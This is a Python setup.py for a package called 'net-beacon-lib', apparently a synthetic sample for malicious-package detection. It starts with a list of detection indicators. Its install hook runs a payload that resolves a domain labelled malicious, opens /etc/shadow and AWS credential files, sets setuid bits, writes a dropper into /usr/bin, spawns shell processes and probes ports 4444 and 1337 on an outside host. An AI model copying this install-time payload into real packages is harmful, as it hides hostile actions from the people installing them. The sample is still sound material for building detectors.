# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, time
from setuptools import setup
from setuptools.command.install import install

MALICIOUS_DOMAIN = "ops-mgr.mav2terol.surf"
PORTS = [4444, 1337]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(); s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    # HTTP GET
    try:
        subprocess.run(["curl","-sS","-m","3","-X","GET",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "User-Agent: net-beacon-lib/1.0",
            "-H", "Authorization: Bearer fake-token",
            "http://127.0.0.1:8080/api/config"], capture_output=True, timeout=6)
    except: pass

    # /etc access — 6 files (moderate)
    for p in ["/etc/passwd","/etc/hosts","/etc/hostname","/etc/resolv.conf","/etc/os-release","/etc/group"]:
        try_open(p)
    for p in ["/root/.aws/credentials","/etc/shadow"]:
        try_open(p)

    for i in range(37):
        p = f"/tmp/net_beacon_lib_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p,p+".renamed"); os.unlink(p+".renamed")
        except: pass

    # priv=T — chmod only
    try: subprocess.run(["chmod","777","/tmp/net_beacon_lib_target"],capture_output=True)
    except: pass
    try: subprocess.run(["chmod","u+s","/tmp/net_beacon_lib_target"],capture_output=True)
    except: pass

    # NO obfuscation, NO process injection, NO persistence

    # write_binary=T
    try:
        subprocess.run(["/bin/sh","-c",
            "exec 3>/usr/bin/net_beacon_lib_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8,capture_output=True)
    except: pass

    # spawned=T — 8 procs
    procs = []
    for i in range(8):
        try: procs.append(subprocess.Popen(["/bin/sh","-c","echo process-op; id; sleep 20"],
            stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL))
        except: pass

    for port in PORTS:
        connect_attempt("127.0.0.1",port)
        connect_attempt("1.1.1.1",port)

    time.sleep(34)
    for p in procs:
        try: p.kill()
        except: pass

class PostInstall(install):
    def run(self):
        install.run(self)
        run_payload()

if __name__ == "__main__":
    run_payload()

setup(
    name="net-beacon-lib",
    version="3.0.0",
    description="Network beaconing and connectivity monitoring library",
    packages=["net_beacon_lib"],
    cmdclass={"install": PostInstall},
)
